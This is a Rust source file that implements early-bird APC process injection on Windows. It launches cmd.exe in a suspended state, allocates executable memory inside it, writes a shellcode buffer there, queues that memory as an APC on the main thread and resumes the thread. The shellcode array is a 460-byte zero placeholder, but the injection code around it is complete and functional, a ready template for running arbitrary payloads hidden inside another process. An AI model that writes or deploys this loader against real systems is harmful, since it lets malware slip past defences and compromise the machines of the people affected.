use std::mem::{size_of, transmute};
use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE, PAPCFUNC},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            Threading::{
                CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
                STARTF_USESHOWWINDOW, STARTUPINFOW,
            },
        },
    },
    core::{Result, w},
};

struct HandleGuard(HANDLE);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.is_invalid() {
                let _ = CloseHandle(self.0);
            }
        }
    }
}

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    let s_info = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTF_USESHOWWINDOW,
        ..Default::default()
    };

    let mut p_info = PROCESS_INFORMATION::default();

    unsafe {
        CreateProcessW(
            w!("C:\\Windows\\System32\\cmd.exe"),
            None,
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            w!("C:\\Windows\\System32"),
            &s_info,
            &mut p_info,
        )?
    };

    let _h_process_guard = HandleGuard(p_info.hProcess);
    let _h_thread_guard = HandleGuard(p_info.hThread);

    let h_memory = unsafe {
        VirtualAllocEx(
            p_info.hProcess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if h_memory.is_null() {
        return Ok(());
    }

    let mut bytes_written = 0usize;

    unsafe {
        WriteProcessMemory(
            p_info.hProcess,
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?
    };

    let papc_func: PAPCFUNC = unsafe { transmute(h_memory) };

    if unsafe { QueueUserAPC(papc_func, p_info.hThread, 0) } == 0 {
        return Ok(());
    }

    if unsafe { ResumeThread(p_info.hThread) } == u32::MAX {
        return Ok(());
    }

    Ok(())
}
